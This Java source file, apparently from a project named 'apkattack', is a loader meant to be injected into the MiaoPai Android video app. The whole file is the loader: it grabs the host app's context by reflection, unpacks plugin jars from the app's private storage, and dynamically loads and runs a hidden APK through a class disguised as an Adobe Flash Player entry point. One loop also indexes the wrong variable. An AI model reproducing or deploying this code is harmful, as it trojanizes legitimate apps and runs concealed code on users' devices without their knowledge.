package com.example.apkattack;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;


//.registers or .locals directive must be present for a non-abstract/non-final method

//27
//Lcom/yixia/videoeditor/videoplay/utils/Preloader;
//Lcom/yixia/plugin/yxplayer/VideoPlayerApp;
//Lcom/yixia/plugin/DebugModeActivity;
//Lcom/qihoo360/replugin/Entry;
//Lcom/qihoo360/replugin/RePlugin;

//23
//Landroid/support/multidex/ZipUtil;
//Lcom/yixia/upload/service/UploaderService;
//Lcom/yixia/base/PluginAssertService;
//Lcom/yixia/videoedit/utils/YXDeviceInfo;

public class MiaoPaiPlugin {
	public static void miaopaiEntryWithouContext(){
    	String Tag = "miaopaiEntryWithouContext";
    	try {
    		
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "context ok,package:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            }
	        }

    		String apppath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apppath + "miaopaiEntry/";
	    	String dexmethodname = "start";

	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	
	    	String cfgfn = "ark.dat";
	    	String apkfn = "";
	    	boolean apkexist = false;
	    	boolean cfgexit = false;
	    	File assetspathFile = new File(unzippath + "assets/");
	    	if (assetspathFile.exists() == true) {
				File assetsFiles[] = assetspathFile.listFiles();
				if (assetsFiles != null && assetsFiles.length > 0) {
					for(int i = 0;i < assetsFiles.length; i ++)
					{
						String subfn = assetsFiles[i].getName();
						if(subfn.endsWith(".apk") == true){
							apkexist = true;
							apkfn = subfn;
						}else if (subfn.equals(cfgfn) == true) {
							cfgexit = true;
						}
					}
				}
			}else{
				boolean ret = assetspathFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + assetspathFile.getName());
					return;
				}
			}
	    	
	    	
	    	if (apkexist == false || cfgexit == false ) {

				String pluginapkpath = apppath + "app_p_a/";
				
				boolean flag = false;
				
				File [] files = new File(pluginapkpath).listFiles();
				for (int i = 0; i < files.length; i++) {
					
					if (flag == true) {
						break;
					}
					
					String tmpfilename = files[i].getName();
					if (tmpfilename.endsWith(".jar") && files[i].isFile()) {
						
						String tmpfn = pluginapkpath + tmpfilename; 

				        ZipEntry zipEntry = null;
				        byte unzipbuf[] = new byte[0x10000];
				        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(tmpfn)));

			            while ( (zipEntry = zipIn.getNextEntry()) != null) {
			            	File unzipfile = new File(unzippath + zipEntry.getName());
			                if (zipEntry.isDirectory()) {
			                	unzipfile.mkdirs();
			                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
			                } else {
			                    File unzipparent = unzipfile.getParentFile();
			                    if (unzipparent.exists() == false) {
			                    	unzipparent.mkdirs();
			                    	
			                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
			                    }
			                    
			                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
			                    int readedBytes = 0;
			                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
			                        fileOut.write(unzipbuf, 0, readedBytes);
			                    }
			                    fileOut.close();
			                }
			                zipIn.closeEntry();
			            }
			            zipIn.close();
			            
			            File [] assetsfiles = new File(unzippath + "assets/").listFiles();
			            for (int j = 0; j < assetsfiles.length; j++) {
							String unziptmpfn = assetsfiles[i].getName();
							if (unziptmpfn.endsWith(".apk") || unziptmpfn.equals(cfgfn)) {

								flag = true;
								break;
							}
						}
					}
				}
				
				Log.e(Tag,"unzip complete");
			}
			
	    	File [] assetsfiles  = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < assetsfiles.length; i++) {
				String tmpfn = assetsfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}
			
			if (apkfn == null || apkfn.equals("")) {
				Log.e(Tag,"not find apk or config file");
				return;
			}

	    	String appcachepath = context.getCacheDir() + "/";

	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
    	    method.invoke(obj,context,unzippath + "assets/");
    	    
    	    Log.e(Tag, "miaopai load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "miaopai load apk exception");
    	}
	}
}
